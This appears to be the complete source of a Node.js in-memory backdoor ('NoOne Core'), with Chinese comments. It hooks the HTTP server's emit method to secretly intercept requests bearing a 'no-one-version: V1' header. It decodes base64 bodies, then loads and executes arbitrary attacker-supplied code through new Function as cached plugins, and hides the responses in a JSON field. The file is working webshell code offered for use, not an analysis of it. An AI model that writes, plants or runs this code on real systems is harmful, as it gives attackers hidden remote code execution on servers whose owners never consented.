(async () => {
    const http = await import('node:http');
    const originalEmit = http.Server.prototype.emit;

    http.Server.prototype.emit = async function(event, req, res) {
        if (event === 'request' && req.headers['no-one-version'] === 'V1') {
            try {
                const noOneCore = initNoOneCore();
                const rawBody = await getRawBody(req);
                const payload = transformReqPayload(getArgFromContent(rawBody));

                const result = await noOneCore.equals(payload);
                const data = wrapResData(transformResData(result))
                res.writeHead(200, {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(data)
                });
                res.end(data);
            } catch (error) {
                console.error('处理错误:', error.message);
                console.error(error.stack);
            }
            return true;
        }

        return originalEmit.apply(this, arguments);
    };

    async function getRawBody(req){
        const chunks = [];
        for await (const chunk of req) {
            chunks.push(chunk);
        }
        return Buffer.concat(chunks);
    }

    function getArgFromContent(content){
        return content.slice(11, content.length - 2);
    }

    function transformReqPayload(payload){
        return Buffer.from(payload.toString('utf8'), 'base64');
    }

    function transformResData(data){
        return data.toString('base64');
    }

    function wrapResData(data){
        return `{"hello": "${data}"}`
    }

    // NoOne Core 代码字符串
    const NOONE_CORE_CODE = ``;

    // 常量定义
    const ACTION = "action";
    const PLUGIN = "plugin";
    const CLASS_BYTES = "pluginCode";
    const ARGS = "args";

    const REFRESH = "refresh";
    const PLUGIN_CACHES = "pluginCaches";
    const GLOBAL_CACHES = "globalCaches";

    const ACTION_STATUS = "status";
    const ACTION_RUN = "run";
    const ACTION_LOAD = "load";
    const ACTION_CLEAN = "clean";

    const CODE = "code";
    const ERROR = "error";
    const DATA = "data";
    const SUCCESS = 0;
    const FAILURE = 1;

    // 插件缓存
    const loadedPluginCache = new Map();
    const globalCaches = new Map();

    // 序列化
    function serialize(obj) {
        return Buffer.from(JSON.stringify(obj), 'utf8');
    }

    // 反序列化
    function deserialize(buffer) {
        return JSON.parse(buffer.toString('utf8'));
    }

    // 获取状态
    function getStatus() {
        const result = {};
        result[PLUGIN_CACHES] = loadedPluginCache.keys().toArray();
        return result;
    }

    // 加载插件
    function load(args, result) {
        const plugin = args[PLUGIN];
        const pluginCode = args[CLASS_BYTES];
        console.log("pluginCode: " + pluginCode);
        let pluginObj = loadedPluginCache.get(plugin);
        if (pluginObj == null) {
            if (plugin == null) {
                throw new Error("plugin is required");
            }
            if (pluginCode == null) {
                throw new Error("pluginCode are required for class loading");
            }

            try {
                const pluginFunc = new Function(pluginCode)();
                if (typeof pluginFunc === 'function') {
                    pluginObj = pluginFunc;
                } else {
                    pluginObj = pluginFunc;
                }
                loadedPluginCache.set(plugin, pluginObj);
            } catch (error) {
                console.error(error);
                throw new Error(`Failed to load class: ${error.message}\n${error.stack}`);
            }
        }

        return pluginObj;
    }

    // 运行插件
    async function run(args) {
        const plugin = args[PLUGIN];
        const pluginObj = loadedPluginCache.get(plugin);
        console.log("pluginObj: " + pluginObj);
        let map = args[ARGS];
        if (map == null) {
            map = {};
        }
        map[PLUGIN_CACHES] = Object.fromEntries(loadedPluginCache);
        map[GLOBAL_CACHES] = Object.fromEntries(globalCaches);
        await pluginObj.equals(map);
        console.log("plugin result: ", map.result);
        const result = {};
        result[DATA] = map.result;
        return result;
    }

    // 处理请求的核心逻辑 (equals 方法)
    async function equals(inputBytes) {
        const result = {};
        result[CODE] = SUCCESS;

        let args = {};
        try {
            args = deserialize(inputBytes);
        } catch (e) {
            result[CODE] = FAILURE;
            result[ERROR] = `args parsed failed: ${e.message}\n${e.stack}`;
            return serialize(result);
        }

        const action = args[ACTION];
        if (action != null) {
            try {
                switch (action) {
                    case ACTION_STATUS:
                        Object.assign(result, getStatus());
                        break;
                    case ACTION_RUN:
                        Object.assign(result, await run(args));
                        break;
                    case ACTION_LOAD:
                        const loaded = load(args, result);
                        result[DATA] = loaded != null;
                        break;
                    case ACTION_CLEAN:
                        loadedPluginCache.clear();
                        globalCaches.clear();
                        result[DATA] = true;
                        break;
                    default:
                        result[CODE] = FAILURE;
                        result[ERROR] = `action [${action}] not supported`;
                        break;
                }
            } catch (e) {
                result[CODE] = FAILURE;
                result[ERROR] = `action [${action}] run failed: ${e.message}\n${e.stack}`;
            }
        } else {
            result[CODE] = FAILURE;
            result[ERROR] = "action is required";
        }

        return serialize(result);
    }

    function initNoOneCore() {
        if (!global.NoOneCore) {
            // global.NoOneCore = new Function(NOONE_CORE_CODE)();
            global.NoOneCore = {
                equals: equals,
                loadedPluginCache: loadedPluginCache,
                globalCaches: globalCaches,
                getStatus: getStatus,
                load: load,
                run: run
            }
        }
        console.log("core init success")
        return global.NoOneCore;
    }

    const server = http.createServer((req, res) => {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('NoOne Core Server - Use No-One-Version: V1 header\n');
    });

    const PORT = 3000;
    server.listen(PORT, () => {
        console.log(`NoOne Core Server running at http://localhost:${PORT}/`);
        console.log('NoOne Core 将在首次请求时初始化');
    });
})();